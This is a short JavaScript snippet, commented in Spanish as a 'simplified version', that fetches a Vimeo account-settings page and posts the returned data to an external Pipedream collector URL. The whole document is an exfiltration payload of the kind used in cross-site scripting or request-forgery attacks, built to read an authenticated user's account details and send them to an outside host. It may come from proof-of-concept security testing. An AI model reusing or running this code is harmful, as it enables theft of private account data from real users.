// Versión simplificada
fetch('https://vimeo.com/settings/account/general')
  .then(response => response.json())
  .then(data => {
    return fetch('https://eo55p1jx1f3g537.m.pipedream.net/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
  })
  .then(response => console.log('Enviado a Pipedream'))
  .catch(error => console.error('Error:', error));
